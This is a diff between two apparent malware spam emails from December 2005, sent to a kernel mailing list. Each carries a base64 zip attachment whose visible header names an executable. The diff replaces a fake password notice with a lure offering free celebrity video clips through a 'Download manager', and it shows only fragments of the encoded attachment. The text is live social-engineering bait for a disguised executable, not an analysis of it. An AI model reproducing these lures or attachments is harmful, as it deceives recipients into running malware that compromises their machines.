@@ -1,29 +1,30 @@
-From: Admin@deathsdoor.com
-Subject: Your_Password
-Date: Fri, 23 Dec 2005 14:52:43 UTC
-Message-ID: <0eedac9b9df.ccb41@deathsdoor.com>
+From: info@sport.cam.ac.uk
+Subject: Paris_Hilton_&_Nicole_Richie
+Date: Fri, 23 Dec 2005 15:29:27 GMT
+Message-ID: <47fb70c06d786db10aa@flajylua.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="======7f9ed1a5af611e51f8"
+Content-Type: multipart/mixed; boundary="=====d8e8eba.b38c52a6fd7e6"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: MailIn_Box@oss.sgi.com
+To: mailserver@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---======7f9ed1a5af611e51f8
+--=====d8e8eba.b38c52a6fd7e6
 
-Account and Password Information are attached!
+The Simple Life:
 
+View Paris Hilton & Nicole Richie video clips , pictures & more ;)
+Download is free until Jan, 2006!
 
-***** Go to: http://www.deathsdoor.com
-***** Email: postman@deathsdoor.com
---======7f9ed1a5af611e51f8
-Content-Type: application/octet-stream; name=reg_pass.zip
+Please use our Download manager.
+--=====d8e8eba.b38c52a6fd7e6
+Content-Type: application/octet-stream; name=downloadm.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass.zip"
+Content-Disposition: attachment; filename="downloadm.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1001,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---======7f9ed1a5af611e51f8--
+--=====d8e8eba.b38c52a6fd7e6--
